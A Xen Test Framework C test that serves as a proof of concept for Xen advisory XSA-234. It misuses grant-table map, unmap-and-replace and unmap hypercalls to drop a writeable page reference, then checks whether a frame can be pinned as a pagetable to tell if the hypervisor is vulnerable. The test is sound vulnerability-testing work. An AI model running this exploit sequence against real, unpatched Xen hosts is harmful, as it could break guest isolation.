/**
 * @file tests/xsa-234/main.c
 * @ref test-xsa-234
 *
 * @page test-xsa-234 XSA-234
 *
 * Advisory: [XSA-234](http://xenbits.xen.org/xsa/advisory-234.html)
 *
 * Various grant unmapping operations will succeed and drop a writeable
 * reference count, even when the mapping was only read-only.  This can be
 * used to shuffle a writeable mapping out of Xen's reference counting.
 *
 * @see tests/xsa-234/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-234 PoC";

static uint8_t frame1[PAGE_SIZE] __page_aligned_bss;
static uint8_t frame2[PAGE_SIZE] __page_aligned_bss;

void test_main(void)
{
    int rc = xtf_init_grant_table(1);
    if ( rc )
        return xtf_error("Error initialising grant table: %d\n", rc);

    int domid = xtf_get_domid();
    if ( domid < 0 )
        return xtf_error("Error getting domid\n");

    /* Remap frame1 as read-only to drop the writeable reference on it. */
    if ( hypercall_update_va_mapping(
             _u(frame1), pte_from_virt(frame1, PF_SYM(AD, P)), UVMF_INVLPG) )
        return xtf_error("Failed to remap frame1 as read-only\n");

    /* Grant frame1 and 2 to ourselves. */
    gnttab_v1[8].domid = domid;
    gnttab_v1[8].frame = virt_to_gfn(frame1);
    smp_wmb();
    gnttab_v1[8].flags = GTF_permit_access;

    gnttab_v1[9].domid = domid;
    gnttab_v1[9].frame = virt_to_gfn(frame2);
    smp_wmb();
    gnttab_v1[9].flags = GTF_permit_access;

    /* Grant map frame1 writeably at 4k... */
    struct gnttab_map_grant_ref map = {
        .host_addr = KB(4),
        .flags = GNTMAP_host_map,
        .ref = 8,
        .dom = domid,
    };

    rc = hypercall_grant_table_op(GNTTABOP_map_grant_ref, &map, 1);
    if ( rc || map.status )
        return xtf_error("Failed to map grant[8]\n");

    grant_handle_t f1 = map.handle;

    /* ...and grant map frame2 readably at 8k. */
    map = (struct gnttab_map_grant_ref){
        .host_addr = KB(8),
        .flags = GNTMAP_host_map | GNTMAP_readonly,
        .ref = 9,
        .dom = domid,
    };

    rc = hypercall_grant_table_op(GNTTABOP_map_grant_ref, &map, 1);
    if ( rc || map.status )
        return xtf_error("Failed to map grant[9]\n");

    grant_handle_t f2 = map.handle;

    /*
     * Use unmap_and_replace on the mapping of frame2, trying to steal the PTE
     * which maps frame1.
     */
    struct gnttab_unmap_and_replace ur = {
        .host_addr = KB(8),
        .new_addr = KB(4),
        .handle = f2,
    };

    rc = hypercall_grant_table_op(GNTTABOP_unmap_and_replace, &ur, 1);
    if ( rc || ur.status )
        return xtf_error("Failed to unmap and replace grant[9]\n");

    /*
     * The mapping for 4k linear has been zapped, Re-point it at frame1
     * (again, read only so as not to take another type ref) so the vulnerable
     * unmap sanity checks succeed.
     */
    if ( hypercall_update_va_mapping(
             KB(4), pte_from_virt(frame1, PF_SYM(AD, P)), UVMF_INVLPG) )
        return xtf_error("Failed to reset grant[8]\n");

    /*
     * Try to unmap frame1.  If Xen is vulnerable, this will succeed without
     * error.  If Xen is not vulnerable, it should fail with
     * GNTST_general_error beacuse of unexpected PTE flags.
     */
    struct gnttab_unmap_grant_ref unmap = {
        .host_addr = KB(4),
        .handle = f1,
    };

    rc = hypercall_grant_table_op(GNTTABOP_unmap_grant_ref, &unmap, 1);
    if ( rc )
        return xtf_error("Failed to host unmap grant[8]\n");

    /*
     * Irrespective of whether the unmap succeeded, double check the typeref
     * by trying to pin frame1 as a pagetable.
     */
    mmuext_op_t op = {
        .cmd = MMUEXT_PIN_L1_TABLE,
        .arg1.mfn = virt_to_mfn(frame1),
    };

    rc = hypercall_mmuext_op(&op, 1, NULL, DOMID_SELF);
    switch ( rc )
    {
    case 0:
        return xtf_failure("Fail: Vulnerable to XSA-234\n");

    case -EINVAL:
        return xtf_success("Success: Not vulnerable to XSA-234\n");

    default:
        return xtf_error("Unexpected MMUEXT_PIN_L1_TABLE rc %d\n", rc);
    }
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
